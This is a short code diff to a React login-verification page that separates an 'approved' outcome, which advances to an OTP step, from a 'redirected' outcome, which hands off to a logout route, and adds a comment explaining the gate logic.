@@ -152,8 +152,16 @@ export default function VerifyChoicePage() {
       const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
       setLoadingMethod(null);
 
-      if (outcome === "approved" || outcome === "redirected") {
+      /* Gate 1 is an INTERMEDIATE gate, so approve and redirect diverge:
+         approve advances to the OTP step, redirect is the final hand-off.
+         (Gate 2 is the final gate and correctly folds both — see
+         app/verify/page.tsx. Matrix rows 1 and 2.) */
+      if (outcome === "approved") {
         router.push("/verify");
+        return;
+      }
+      if (outcome === "redirected") {
+        window.location.href = "/api/login-out";
         return;
       }
 
